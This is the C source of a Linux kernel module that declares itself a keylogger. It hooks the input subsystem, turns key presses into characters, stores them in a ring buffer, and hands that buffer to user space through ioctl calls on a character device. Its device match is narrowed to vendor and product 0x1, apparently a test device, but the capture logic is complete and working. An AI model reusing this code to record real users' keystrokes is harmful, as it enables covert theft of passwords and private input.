#include "keylogger.h"

#include <linux/init.h>
#include <linux/kernel.h>

#define DEBUG_MSG(fmt, ...)                                    \
	do {                                                   \
		if (debug_enabled)                             \
			printk(KERN_DEBUG fmt, ##__VA_ARGS__); \
	} while (0)

static int debug_enabled = 0;
module_param(debug_enabled, int, 0644);
MODULE_PARM_DESC(debug_enabled, "Enable debug output");

static char *buffer;
static int major_device_number;
static int shift_pressed = 0;
static int buffer_size = 16;
static int buffer_index_to_write = 0;

static DEFINE_MUTEX(buffer_mutex);

char map[MAP_SIZE] = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";
char shift_map[MAP_SIZE] =
	"..!@#$%^&*()_+..QWERTYUIOP{}..ASDFGHJKL:\"~.|ZXCVBNM<>?";

// ----------------- Buffer Management -----------------
int allocate_buffer(int size)
{
	if (size <= 0 || size > MAX_BUFFER_SIZE) {
		return -EINVAL;
	}

	buffer = kmalloc(size, GFP_KERNEL);
	if (!buffer) {
		return -ENOMEM;
	}

	memset(buffer, 0, size);
	buffer_size = size;
	buffer_index_to_write = 0;
	DEBUG_MSG("[INFO] buffer allocated with size: %d\n", size);
	return 0;
}

void free_buffer(void)
{
	if (buffer) {
		kfree(buffer);
		buffer = NULL;
		buffer_size = 0;
		buffer_index_to_write = 0;
		DEBUG_MSG("[INFO] buffer freed\n");
	}
}

// ----------------- IOCTL Handling -----------------
long keylogger_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	switch (cmd) {
	case IOCTL_GET_BUFFER_SIZE:
		if (put_user(buffer_size, (int __user *)arg))
			return -EFAULT;
		return 0;

	case IOCTL_GET_BUFFER_DATA:
		if (!buffer || buffer_size <= 0)
			return -EINVAL;

		if (copy_to_user((char __user *)arg, buffer, buffer_size))
			return -EFAULT;
		return 0;

	case IOCTL_SET_BUFFER_SIZE: {
		int new_size;

		if (get_user(new_size, (int __user *)arg))
			return -EFAULT;

		if (new_size <= 0 || new_size > MAX_BUFFER_SIZE)
			return -EINVAL;

		free_buffer();

		if (allocate_buffer(new_size) < 0)
			return -ENOMEM;

		DEBUG_MSG("[INFO] buffer size changed to: %d\n", new_size);
		return 0;
	}

	case IOCTL_CLEAR_BUFFER_DATA:
		mutex_lock(&buffer_mutex);
		if (buffer) {
			memset(buffer, 0, buffer_size);
			buffer_index_to_write = 0;
			DEBUG_MSG("[INFO] buffer data cleared\n");
		}
		mutex_unlock(&buffer_mutex);
		return 0;

	default:
		return -ENOTTY;
	}
}

// ----------------- Input Handler -----------------
int keylogger_connect(struct input_handler *handler, struct input_dev *dev,
		      const struct input_device_id *id)
{
	struct input_handle *handle;
	int error;

	handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
	if (!handle)
		return -ENOMEM;

	handle->dev = dev;
	handle->handler = handler;
	handle->name = "keylogger_handle";

	error = input_register_handle(handle);
	if (error)
		goto err_free_handle;

	error = input_open_device(handle);
	if (error)
		goto err_unregister_handle;

	DEBUG_MSG("[INFO] successfully connected to device: %s\n", dev->name);
	return 0;

err_unregister_handle:
	input_unregister_handle(handle);
err_free_handle:
	kfree(handle);
	return error;
}

void keylogger_disconnect(struct input_handle *handle)
{
	DEBUG_MSG("[INFO] device disconnected: %s\n", handle->dev->name);
	input_close_device(handle);
	input_unregister_handle(handle);
	kfree(handle);
}

void keylogger_event_handler(struct input_handle *handle, unsigned int type,
			     unsigned int code, int value)
{
	if (type != EV_KEY || code >= MAP_SIZE || map[code] == 0 ||
	    shift_map[code] == 0) {
		return;
	}

	if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) {
		shift_pressed = (value == 1);
		return;
	}

	if (value == 1) {
		char key_char = shift_pressed ? shift_map[code] : map[code];

		if (code != KEY_ENTER && code != KEY_TAB &&
		    code != KEY_CAPSLOCK && code != KEY_SPACE &&
		    code != KEY_BACKSPACE) {
			mutex_lock(&buffer_mutex);
			buffer[buffer_index_to_write] = key_char;
			buffer_index_to_write =
				(buffer_index_to_write + 1) % buffer_size;
			mutex_unlock(&buffer_mutex);
		}
	}
}

// ----------------- Struct Declarations ---------------
static struct class *keylogger_class = NULL;
static struct device *keylogger_device = NULL;

static const struct file_operations fops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = keylogger_ioctl,
};

static const struct input_device_id keylogger_id_table[] = {
	{ .driver_info = 1,
	  .flags = INPUT_DEVICE_ID_MATCH_VENDOR | INPUT_DEVICE_ID_MATCH_PRODUCT,
	  .vendor = 0x1,
	  .product = 0x1 },
	{}
};

static struct input_handler my_input_handler = {
	.name = "keylogger",
	.event = keylogger_event_handler,
	.connect = keylogger_connect,
	.disconnect = keylogger_disconnect,
	.id_table = keylogger_id_table,
};

// ----------------- Module Init/Exit -----------------
static int __init keylogger_init(void)
{
	int error;

	DEBUG_MSG("[INFO] initializing keylogger module...\n");

	major_device_number = register_chrdev(0, DEVICE_NAME, &fops);
	if (major_device_number < 0) {
		error = major_device_number;
		goto error;
	}

	keylogger_class = class_create(THIS_MODULE, DEVICE_NAME);
	if (IS_ERR(keylogger_class)) {
		error = PTR_ERR(keylogger_class);
		goto unregister_chrdev;
	}

	keylogger_device = device_create(keylogger_class, NULL,
					 MKDEV(major_device_number, 0), NULL,
					 DEVICE_NAME);
	if (IS_ERR(keylogger_device)) {
		error = PTR_ERR(keylogger_device);
		goto destroy_class;
	}

	error = allocate_buffer(buffer_size);
	if (error) {
		goto destroy_device;
	}

	error = input_register_handler(&my_input_handler);
	if (error) {
		goto free_buffer;
	}

	DEBUG_MSG("[INFO] keylogger module initialized successfully\n");
	return 0;

free_buffer:
	free_buffer();
destroy_device:
	device_destroy(keylogger_class, MKDEV(major_device_number, 0));
destroy_class:
	class_destroy(keylogger_class);
unregister_chrdev:
	unregister_chrdev(major_device_number, DEVICE_NAME);
error:
	return error;
}

static void __exit keylogger_exit(void)
{
	DEBUG_MSG("[INFO] exiting keylogger module...\n");

	input_unregister_handler(&my_input_handler);
	free_buffer();

	if (keylogger_device) {
		device_destroy(keylogger_class, MKDEV(major_device_number, 0));
	}

	if (keylogger_class) {
		class_unregister(keylogger_class);
		class_destroy(keylogger_class);
	}

	unregister_chrdev(major_device_number, DEVICE_NAME);
	DEBUG_MSG("[INFO] keylogger module exited successfully\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Przemyslaw Ozga <przemyslaw.ozga@intel.com>");
MODULE_DESCRIPTION(
	"A kernel module that logs keystrokes and handles buffer operations");
